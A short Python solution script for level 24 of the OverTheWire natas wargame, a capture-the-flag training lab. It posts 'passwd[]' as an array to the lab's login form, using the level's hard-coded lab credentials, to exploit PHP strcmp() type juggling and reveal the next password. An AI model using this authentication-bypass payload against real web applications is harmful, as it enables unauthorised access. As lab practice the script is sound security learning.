# Import Library
import requests
import re
from string import *

# Setting variables needed
username = 'natas24'
password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'

url=f'http://{username}.natas.labs.overthewire.org/'
pw = []
characters = ascii_letters + digits

# Connect to natas
session = requests.session()
#"strcmp()" returns 0 when Array is compared to String. Therefore, "passwd" is passed in as 'Array' on this level.
payloads = {"passwd[]":'anything'}
cookies = {}
response = session.request('POST', url, auth=(username,password), data=payloads)
print(response.cookies)
#print(''.join(pw))

# Filtering to get a password
#result = re.findall('Password: (.*)</pre>', response.text)[0]
print(response.text)
